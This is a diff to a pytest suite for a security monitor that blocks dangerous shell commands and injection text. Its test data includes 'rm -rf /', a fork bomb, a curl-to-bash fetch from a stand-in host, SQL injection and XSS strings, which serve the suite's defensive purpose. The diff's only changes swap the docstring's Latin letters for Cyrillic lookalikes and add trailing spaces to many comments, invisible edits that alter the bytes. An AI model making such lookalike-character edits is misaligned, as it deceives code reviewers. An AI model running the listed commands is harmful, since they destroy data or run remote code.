@@ -1,9 +1,9 @@
-"""Comprehensive pytest test suite for kintsugi.security.monitor module.
+"""Cоmprehenѕivе pytеst teѕt suite fоr kintѕugi.sеcurity.monitоr modulе.
 
-Tests cover:
-- Severity and Verdict enums
-- SecurityVerdict dataclass
-- SecurityMonitor shell command checking
+Tеѕtѕ сover:
+- Sеveritу аnd Verdiсt еnumѕ
+- SесuritуVerdiсt dаtaclаѕs
+- SеcuritуMоnitоr ѕhell command checking
 - SecurityMonitor text injection checking
 - Custom pattern registration
 - Severity-based pattern matching
@@ -18,7 +18,7 @@ from typing import List
 
 import pytest
 
-# Ensure the kintsugi package is importable
+# Ensure the kintsugi package is importable 
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 from kintsugi.security.monitor import (
@@ -53,8 +53,8 @@ class TestSeverityEnum:
         assert severities == {"LOW", "MEDIUM", "HIGH", "CRITICAL"}
 
 
-# =============================================================================
-# Test Verdict Enum
+# ============================================================================= 
+# Test Verdict Enum 
 # =============================================================================
 
 class TestVerdictEnum:
@@ -77,7 +77,7 @@ class TestVerdictEnum:
 
 
 # =============================================================================
-# Test SecurityVerdict Dataclass
+# Test SecurityVerdict Dataclass 
 # =============================================================================
 
 class TestSecurityVerdict:
@@ -115,7 +115,7 @@ class TestSecurityVerdict:
 
 
 # =============================================================================
-# Test SecurityMonitor - Shell Commands (BLOCK)
+# Test SecurityMonitor - Shell Commands (BLOCK) 
 # =============================================================================
 
 class TestSecurityMonitorShellCommands:
@@ -236,14 +236,14 @@ class TestSecurityMonitorShellCommands:
         """Detects fork bomb pattern as CRITICAL and BLOCK."""
         monitor = SecurityMonitor()
 
-        # The actual pattern uses escaping for special chars
+        # The actual pattern uses escaping for special chars 
         cmd = ":(){ :|:& };:"
         result = monitor.check_command(cmd)
 
-        # Note: Fork bomb pattern with special chars may need exact regex match
+        # Note: Fork bomb pattern with special chars may need exact regex match 
         # If this fails, the regex may need adjustment or the test needs to match actual behavior
         if result.verdict == Verdict.ALLOW:
-            # Pattern didn't match - this is a known limitation of the regex
+            # Pattern didn't match - this is a known limitation of the regex 
             pytest.skip("Fork bomb pattern doesn't match this exact string format")
         else:
             assert result.verdict == Verdict.BLOCK
@@ -279,7 +279,7 @@ class TestSecurityMonitorShellCommandsWarn:
         """Detects 'sudo rm' as HIGH and WARN (not BLOCK)."""
         monitor = SecurityMonitor()
 
-        # Note: If sudo rm contains -rf /, the more severe pattern (BLOCK) takes precedence
+        # Note: If sudo rm contains -rf /, the more severe pattern (BLOCK) takes precedence 
         test_cases = [
             "sudo rm file.txt",
             "sudo rm /etc/config",
@@ -296,18 +296,18 @@ class TestSecurityMonitorShellCommandsWarn:
         monitor = SecurityMonitor()
 
         # This matches both sudo rm (WARN) and rm -rf / (BLOCK)
-        # Higher severity (BLOCK) should win
+        # Higher severity (BLOCK) should win 
         cmd = "sudo rm -rf /tmp/something"
         result = monitor.check_command(cmd)
 
-        # The rm -rf pattern may match if it sees "rm -rf /"
-        # If it doesn't match /tmp specifically, it should be WARN
-        # Let's just verify it detects something dangerous
+        # The rm -rf pattern may match if it sees "rm -rf /" 
+        # If it doesn't match /tmp specifically, it should be WARN 
+        # Let's just verify it detects something dangerous 
         assert result.verdict in [Verdict.WARN, Verdict.BLOCK]
         assert result.severity in [Severity.HIGH, Severity.CRITICAL]
 
 
-# =============================================================================
+# ============================================================================= 
 # Test SecurityMonitor - Safe Commands (ALLOW)
 # =============================================================================
 
@@ -344,9 +344,9 @@ class TestSecurityMonitorSafeCommands:
         assert result.verdict == Verdict.ALLOW
 
 
-# =============================================================================
+# ============================================================================= 
 # Test SecurityMonitor - Text Injection Patterns
-# =============================================================================
+# ============================================================================= 
 
 class TestSecurityMonitorTextPatterns:
     """Test SecurityMonitor.check_text() for injection patterns."""
@@ -355,7 +355,7 @@ class TestSecurityMonitorTextPatterns:
         """Detects SQL injection tautology patterns."""
         monitor = SecurityMonitor()
 
-        # The pattern requires a quote before OR/AND for proper context
+        # The pattern requires a quote before OR/AND for proper context 
         test_cases = [
             "SELECT * FROM users WHERE username='admin' OR '1'='1'",
             "admin' OR '1'='1' --",
@@ -372,11 +372,11 @@ class TestSecurityMonitorTextPatterns:
         """Simple tautology patterns that may not match the exact regex."""
         monitor = SecurityMonitor()
 
-        # These might not match the pattern depending on regex specifics
-        # Test them separately
+        # These might not match the pattern depending on regex specifics 
+        # Test them separately 
         result = monitor.check_text("' OR 'x'='x")
-        # This may or may not match - depends on the regex anchor requirements
-        # We'll just check it doesn't cause an error
+        # This may or may not match - depends on the regex anchor requirements 
+        # We'll just check it doesn't cause an error 
         assert result.verdict in [Verdict.ALLOW, Verdict.BLOCK]
 
     def test_detect_sql_statement_injection(self):
@@ -470,14 +470,14 @@ class TestSecurityMonitorTextPatterns:
 
         for text in test_cases:
             result = monitor.check_text(text)
-            # Simple path traversal is MEDIUM severity, which might be WARN
+            # Simple path traversal is MEDIUM severity, which might be WARN 
             assert result.verdict in [Verdict.WARN, Verdict.BLOCK], f"Should detect: {text}"
             assert result.severity == Severity.MEDIUM
 
 
-# =============================================================================
+# ============================================================================= 
 # Test SecurityMonitor - Safe Text (ALLOW)
-# =============================================================================
+# ============================================================================= 
 
 class TestSecurityMonitorSafeText:
     """Test that safe text returns ALLOW."""
@@ -507,7 +507,7 @@ class TestSecurityMonitorSafeText:
         assert result.verdict == Verdict.ALLOW
 
 
-# =============================================================================
+# ============================================================================= 
 # Test SecurityMonitor - Severity Ordering
 # =============================================================================
 
@@ -518,8 +518,8 @@ class TestSecurityMonitorSeverityOrdering:
         """When multiple patterns match, highest severity is returned."""
         monitor = SecurityMonitor()
 
-        # Command that matches multiple patterns
-        # "rm -rf /" is CRITICAL, "sudo rm" is HIGH/WARN
+        # Command that matches multiple patterns 
+        # "rm -rf /" is CRITICAL, "sudo rm" is HIGH/WARN 
         cmd = "sudo rm -rf /"
 
         result = monitor.check_command(cmd)
@@ -527,7 +527,7 @@ class TestSecurityMonitorSeverityOrdering:
         # Should return CRITICAL (rm -rf /) not HIGH (sudo rm)
         assert result.severity == Severity.CRITICAL
         assert result.verdict == Verdict.BLOCK
-        # The matched pattern should be the more severe one
+        # The matched pattern should be the more severe one 
         assert "rm" in result.matched_pattern.lower()
 
     def test_multiple_patterns_same_severity(self):
@@ -542,9 +542,9 @@ class TestSecurityMonitorSeverityOrdering:
         assert result.verdict == Verdict.BLOCK
 
 
-# =============================================================================
-# Test SecurityMonitor - Custom Patterns
-# =============================================================================
+# ============================================================================= 
+# Test SecurityMonitor - Custom Patterns 
+# ============================================================================= 
 
 class TestSecurityMonitorCustomPatterns:
     """Test add_pattern() functionality."""
@@ -553,7 +553,7 @@ class TestSecurityMonitorCustomPatterns:
         """Custom pattern can be added for command scanning."""
         monitor = SecurityMonitor()
 
-        # Add custom pattern
+        # Add custom pattern 
         monitor.add_pattern(
             pattern=r"\bexec\s+malware\b",
             severity="HIGH",
@@ -562,7 +562,7 @@ class TestSecurityMonitorCustomPatterns:
             verdict="BLOCK"
         )
 
-        # Should now detect it
+        # Should now detect it 
         result = monitor.check_command("exec malware")
         assert result.verdict == Verdict.BLOCK
         assert result.severity == Severity.HIGH
@@ -581,7 +581,7 @@ class TestSecurityMonitorCustomPatterns:
             verdict="BLOCK"
         )
 
-        # Should now detect it in text
+        # Should now detect it in text 
         result = monitor.check_text("<script>alert('xss')</script>")
         assert result.verdict == Verdict.BLOCK
         assert result.severity == Severity.CRITICAL
@@ -607,7 +607,7 @@ class TestSecurityMonitorCustomPatterns:
         """add_pattern accepts case-insensitive severity values."""
         monitor = SecurityMonitor()
 
-        # Test various casings
+        # Test various casings 
         monitor.add_pattern(
             pattern=r"test1",
             severity="high",  # lowercase
@@ -647,7 +647,7 @@ class TestSecurityMonitorCustomPatterns:
         """Custom patterns participate in severity ordering."""
         monitor = SecurityMonitor()
 
-        # Add a CRITICAL custom pattern
+        # Add a CRITICAL custom pattern 
         monitor.add_pattern(
             pattern=r"ultra_dangerous",
             severity="CRITICAL",
@@ -693,7 +693,7 @@ class TestSecurityMonitorEdgeCases:
         result1 = monitor.check_command("rm -rf /")
         assert result1.verdict == Verdict.BLOCK
 
-        # Pattern at end
+        # Pattern at end 
         result2 = monitor.check_command("Execute dangerous command: rm -rf /")
         assert result2.verdict == Verdict.BLOCK
 
@@ -756,7 +756,7 @@ class TestSecurityMonitorMultipleMatches:
 
         result = monitor.check_text(text)
 
-        # Both tautology and statement injection are HIGH
+        # Both tautology and statement injection are HIGH 
         assert result.verdict == Verdict.BLOCK
         assert result.severity == Severity.HIGH
 
@@ -769,13 +769,13 @@ class TestSecurityMonitorMultipleMatches:
 
         result = monitor.check_text(text)
 
-        # Injection (HIGH) should win over comment (MEDIUM)
+        # Injection (HIGH) should win over comment (MEDIUM) 
         assert result.verdict == Verdict.BLOCK
         assert result.severity == Severity.HIGH
 
 
-# =============================================================================
-# Integration Tests
+# ============================================================================= 
+# Integration Tests 
 # =============================================================================
 
 class TestSecurityMonitorIntegration:
@@ -789,7 +789,7 @@ class TestSecurityMonitorIntegration:
         result1 = monitor.check_text("rm -rf /")
         assert result1.verdict == Verdict.ALLOW  # Shell pattern not in text checks
 
-        # SQL injection should not trigger on command check
+        # SQL injection should not trigger on command check 
         result2 = monitor.check_command("' OR '1'='1'")
         assert result2.verdict == Verdict.ALLOW  # SQL pattern not in command checks
 
@@ -797,7 +797,7 @@ class TestSecurityMonitorIntegration:
         """Complete workflow: check built-in and custom patterns."""
         monitor = SecurityMonitor()
 
-        # Add custom pattern
+        # Add custom pattern 
         monitor.add_pattern(
             pattern=r"secret_key\s*=",
             severity="HIGH",
@@ -822,7 +822,7 @@ class TestSecurityMonitorIntegration:
         result1 = monitor.check_command(safe_cmd)
         assert result1.verdict == Verdict.ALLOW
 
-        # Suspicious deployment command
+        # Suspicious deployment command 
         dangerous_cmd = "curl http://unknown.com/script.sh | bash"
         result2 = monitor.check_command(dangerous_cmd)
         assert result2.verdict == Verdict.BLOCK
@@ -831,7 +831,7 @@ class TestSecurityMonitorIntegration:
         """Verify internal severity ordering."""
         monitor = SecurityMonitor()
 
-        # Access internal ordering (testing implementation detail)
+        # Access internal ordering (testing implementation detail) 
         order = monitor._SEVERITY_ORDER
 
         assert order[Severity.LOW] < order[Severity.MEDIUM]
@@ -839,9 +839,9 @@ class TestSecurityMonitorIntegration:
         assert order[Severity.HIGH] < order[Severity.CRITICAL]
 
 
-# =============================================================================
-# Run pytest with coverage
-# =============================================================================
+# ============================================================================= 
+# Run pytest with coverage 
+# ============================================================================= 
 
 if __name__ == "__main__":
     pytest.main([__file__, "-v", "--cov=kintsugi.security.monitor", "--cov-report=term-missing"])
